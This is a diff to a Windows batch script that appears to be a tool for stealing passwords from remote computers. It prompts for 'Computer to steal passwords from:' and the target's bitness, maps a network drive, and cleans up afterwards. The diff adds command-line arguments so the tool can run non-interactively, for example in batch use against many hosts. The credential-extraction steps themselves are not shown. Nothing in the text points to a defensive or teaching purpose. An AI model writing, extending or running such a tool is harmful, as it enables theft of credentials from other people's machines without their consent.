@@ -1,4 +1,7 @@
 @echo off
+set rc=%1
+set rcarc=%2
+if NOT "%1" == "" goto wc
 :begin
 cls
 echo    __      _____________________                
@@ -11,6 +14,7 @@ echo.
 set /p rc=Computer to steal passwords from:
 :goback
 set /p rcarc=Is this computer 32 or 64 bit: 
+:wc
 if NOT "%rcarc%" == "32" if NOT "%rcarc%" == "64" goto goback
 if "%rc%" == "" goto begin
 echo Removing previous mounts to x:
@@ -44,4 +48,4 @@ c:
 echo DONE!
 pause
 net use x: /delete
-goto begin
+if "%1" == "" goto begin
